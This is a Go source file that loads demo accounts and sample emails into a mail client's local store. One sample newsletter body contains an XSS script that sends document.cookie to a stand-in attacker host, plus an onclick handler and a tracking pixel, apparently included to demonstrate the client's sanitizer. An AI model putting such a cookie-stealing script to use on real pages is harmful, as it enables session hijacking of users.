package services

import (
	"time"

	"github.com/HamzaBaghdadi/pigeon/internal/mail"
	"github.com/HamzaBaghdadi/pigeon/internal/mailparse"
	"github.com/HamzaBaghdadi/pigeon/internal/store"
)

// loadDemo writes sample accounts and mail into the store (marked demo=1, so
// they are never synced and can be removed in one go).
func loadDemo(st *store.Store) error {
	if err := st.DeleteDemoAccounts(); err != nil {
		return err
	}
	accounts := []store.Account{
		{Account: mail.Account{ID: "demo-personal", Name: "Personal", Email: "me@example.com", Provider: mail.ProviderGmail, Color: "#2B4FD8", Demo: true}},
		{Account: mail.Account{ID: "demo-work", Name: "Work", Email: "me@work.example", Provider: mail.ProviderOutlook, Color: "#7C4DFF", Demo: true}},
		{Account: mail.Account{ID: "demo-side", Name: "Side project", Email: "hello@pigeon.example", Provider: mail.ProviderIMAP, Color: "#06B6D4", Demo: true}},
	}
	roles := []struct {
		role mail.FolderRole
		name string
	}{
		{mail.RoleInbox, "Inbox"}, {mail.RoleSent, "Sent"}, {mail.RoleDrafts, "Drafts"},
		{mail.RoleArchive, "Archive"}, {mail.RoleSpam, "Spam"}, {mail.RoleTrash, "Trash"},
	}
	for _, a := range accounts {
		if err := st.SaveAccount(a); err != nil {
			return err
		}
		for _, r := range roles {
			if err := st.UpsertFolder(store.FolderRow{
				Folder: mail.Folder{ID: store.FolderID(a.ID, r.name), AccountID: a.ID, Name: r.name, Role: r.role},
				Path:   r.name,
			}); err != nil {
				return err
			}
		}
	}

	now := time.Now()
	type demo struct {
		account, folder string
		fromName, from  string
		subject         string
		ago             time.Duration
		unread, starred bool
		attach          bool
		body            string
	}
	msgs := []demo{
		{"demo-work", "Inbox", "Lina Haddad", "lina@work.example", "Q4 roadmap review — notes and next steps",
			25 * time.Minute, true, true, true, `
<div style="font-family: Segoe UI, sans-serif; color:#1e2350; line-height:1.6">
<p>Hi team,</p>
<p>Thanks everyone for the session today. I've summarised the decisions below so we're all aligned before Friday.</p>
<ol>
<li><b>Search</b> ships first — local full-text search is the top request.</li>
<li><b>Unified inbox</b> follows in the next sprint.</li>
<li>We push <b>calendar integration</b> to Q1.</li>
</ol>
<p>The full deck is attached. Shout if I missed anything.</p>
<p>— Lina</p>
</div>`},
		{"demo-personal", "Inbox", "GitHub", "noreply@github.example", "[pigeon] New star on HamzaBaghdadi/pigeon",
			2 * time.Hour, true, false, false, `
<table width="100%" cellpadding="0" cellspacing="0" style="font-family: -apple-system, Segoe UI, sans-serif">
<tr><td style="padding:24px; background:#f6f8fa; border-radius:12px">
<h2 style="margin:0 0 8px; color:#24292f">Your repository got a new star</h2>
<p style="color:#57606a; margin:0">You now have <b>128</b> stargazers on <a href="https://github.com/HamzaBaghdadi/pigeon">pigeon</a>.</p>
</td></tr></table>`},
		{"demo-personal", "Inbox", "Weekly Digest", "digest@news.example", "This week in open source: 5 projects worth watching",
			5 * time.Hour, false, false, false, `
<div style="max-width:600px; margin:0 auto; font-family: Georgia, serif; color:#222">
<img src="https://tracker.news.example/open.gif?u=8812" width="1" height="1">
<img src="https://cdn.news.example/banner.png" width="600" alt="Weekly Digest banner" style="max-width:100%">
<h1 style="font-size:26px">5 projects worth watching</h1>
<p>Our pick of the week, plus a deep dive into local-first apps and why they feel so fast.</p>
<p onclick="alert('xss')">This paragraph had an onclick handler. Pigeon removed it.</p>
<script>document.location='https://evil.example/steal?c='+document.cookie</script>
<p><a href="https://news.example/read">Read the full issue →</a></p>
</div>`},
		{"demo-work", "Inbox", "Omar Saleh", "omar@work.example", "Can you review my PR before EOD?",
			26 * time.Hour, true, false, false, `<p>Hey,</p><p>It's the keychain refactor we talked about. Small diff, mostly tests. Would love a review before end of day if you have time.</p><p>Thanks!<br>Omar</p>`},
		{"demo-side", "Inbox", "Sara Mansour", "sara@design.example", "Pigeon icon set — first draft",
			30 * time.Hour, false, true, true, `<p>Hi!</p><p>Attached are the folder and action icons. I kept the strokes consistent with the logo, and the accent uses the same blue → violet gradient.</p><p>Let me know what you think.</p><p>Sara</p>`},
		{"demo-personal", "Inbox", "Bank Notifications", "alerts@bank.example", "Your monthly statement is ready",
			2 * 24 * time.Hour, false, false, false, `<p>Your statement for October is now available in online banking.</p><p style="color:#666; font-size:12px">This is an automated message. Please do not reply.</p>`},
		{"demo-work", "Inbox", "Calendar", "calendar@work.example", "Invitation: Design sync @ Thu 2pm",
			3 * 24 * time.Hour, false, false, false, `<p><b>Design sync</b><br>Thursday, 2:00 – 2:45 PM<br>Room: Falcon</p>`},
		{"demo-side", "Inbox", "Nour Khalil", "nour@example.org", "Loved the beta!",
			4 * 24 * time.Hour, false, false, false, `<p>Finally an email app that doesn't look like it's from 2009.</p><p>Small bug: the unread count doesn't update when I archive from the list. Otherwise, perfect.</p>`},
		{"demo-personal", "Sent", "Me", "me@example.com", "Re: Weekend plans",
			6 * time.Hour, false, false, false, `<p>Sounds great, see you Saturday at 10!</p>`},
		{"demo-work", "Drafts", "Me", "me@work.example", "Proposal: encrypted local cache",
			8 * time.Hour, false, false, false, `<p>Draft — outline for encrypting the SQLite cache at rest.</p>`},
		{"demo-personal", "Spam", "Prize Department", "winner@lottery.example", "You have WON $1,000,000!!!",
			12 * time.Hour, true, false, false, `<p>Click <a href="https://lottery.example/claim">here</a> to claim your prize.</p>`},
	}

	for i, d := range msgs {
		var to []mail.Address
		for _, a := range accounts {
			if a.ID == d.account {
				to = []mail.Address{{Name: a.Name, Email: a.Email}}
			}
		}
		folder := store.FolderID(d.account, d.folder)
		uid := uint32(i + 1)
		text := mailparse.HTMLToText(d.body)
		if err := st.UpsertMessage(store.MessageRow{
			MessageSummary: mail.MessageSummary{
				ID: store.MessageID(folder, uid), AccountID: d.account, FolderID: folder,
				From: mail.Address{Name: d.fromName, Email: d.from}, To: to,
				Subject: d.subject, Snippet: mailparse.Snippet(text, 200), Date: now.Add(-d.ago),
				Unread: d.unread, Starred: d.starred, HasAttachments: d.attach,
			},
			UID: uid, BodyHTML: d.body, BodyText: text, BodyFetched: true,
		}); err != nil {
			return err
		}
	}
	return nil
}
